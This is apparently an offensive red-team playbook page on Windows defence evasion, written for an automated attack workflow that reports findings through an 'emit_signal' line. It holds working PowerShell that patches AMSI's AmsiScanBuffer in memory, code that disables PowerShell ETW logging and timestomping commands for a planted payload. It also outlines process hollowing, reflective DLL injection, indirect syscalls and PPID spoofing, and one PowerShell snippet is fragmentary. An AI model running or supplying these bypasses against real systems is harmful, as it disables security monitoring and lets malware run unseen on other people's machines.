# RT08: Defense Evasion - AMSI/ETW Bypass, Process Hollowing, Indirect Syscalls

**MITRE:** T1562.001, T1055.012, T1106 | **When:** AV/EDR present on target.

## AMSI Bypass - In-Memory Patch

```powershell
# Method 1: AmsiScanBuffer patch (most reliable):
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32
$amsiDll = [Win32]::LoadLibrary("amsi.dll")
$amsiAddr = [Win32]::GetProcAddress($amsiDll, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($amsiAddr, [UIntPtr]5, 0x40, [ref]$p) | Out-Null
$patch = [Byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3) # mov eax, 0x80070057; ret (E_INVALIDARG)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $amsiAddr, 6)
```

## ETW Bypass

```powershell
# Disable .NET ETW provider:
$EtwEventSend = [System.Reflection.Assembly]::LoadWithPartialName("System.Management.Automation").GetType("System.Management.Automation.Tracing.PSEtwLogProvider").GetField("etwProvider", "NonPublic,Instance")
[System.Runtime.InteropServices.Marshal]::WriteByte([System.Runtime.InteropServices.Marshal]::ReadIntPtr([System.Runtime.InteropServices.Marshal]::ReadIntPtr([Runtime.InteropServices.Marshal]::ReadIntPtr($EtwEventSend.GetValue([System.Management.Automation.Tracing.PSEtwLogProvider]::Instance),0)), 0), 0x90)
```

## Process Hollowing (T1055.012)

```csharp
// Classic process hollowing:
// 1. Create target process (svchost.exe) in SUSPENDED state
// 2. Unmap target's image from memory
// 3. Write malicious PE at original image base
// 4. Fix PEB ImageBaseAddress
// 5. Resume thread

// Key APIs: CreateProcess (suspended), NtUnmapViewOfSection, VirtualAllocEx,
//           WriteProcessMemory, SetThreadContext, ResumeThread
```

## Reflective DLL Injection (T1055.001)

```csharp
// DLL loads itself into memory from a byte array without touching disk
// No CreateRemoteThread - use APC injection or existing thread hijack

// Cobalt Strike: reflective DLL injection via "execute-assembly" or shinject
// Manual: Invoke-ReflectivePEInjection.ps1 (PowerSploit)
```

## Indirect Syscalls (Hell's Gate / Halo's Gate)

```csharp
// Direct/indirect syscalls bypass EDR user-mode hooks (inline hooks in ntdll.dll)
// By calling the syscall instruction directly, we avoid hooked stubs

// Hell's Gate: extract syscall number from ntdll memory, call syscall directly
// Halo's Gate: if function is hooked, walk ntdll to find adjacent clean syscall number
// RecycledGate: use existing syscall instructions within ntdll as trampolines

// Implementation: VX-API, SysWhispers3, FreshyCalls, Tartarus Gate
// Example (SysWhispers3 generated code):
// NtAllocateVirtualMemory_SysWhispers(...) calls raw syscall number from ntdll
```

## PPID Spoofing (T1134.004)

```csharp
// Spawn process with spoofed parent PID
// Tools: SelectMyParent, ppid_spoof

// Key APIs: CreateProcess with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
// Use legitimate process (explorer.exe, svchost.exe) as parent
// Process tree in EDR shows process as child of legitimate parent

// Via powershell:
$proc = New-Object System.Diagnostics.Process
$proc.StartInfo.FileName = "cmd.exe"
// ... LPPROC_THREAD_ATTRIBUTE_LIST with parent handle
```

## Timestomping (T1070.006)

```powershell
# Modify file timestamps to blend in:
$(Get-Item "C:\Windows\Temp\payload.exe").LastWriteTime = "01/01/2022 12:00:00"
$(Get-Item "C:\Windows\Temp\payload.exe").CreationTime = "01/01/2022 12:00:00"
$(Get-Item "C:\Windows\Temp\payload.exe").LastAccessTime = "01/01/2022 12:00:00"
```

**Signal:** `emit_signal SURFACE_FOUND "AMSI/ETW bypass confirmed on <host>" "main/redteam" 0.90`
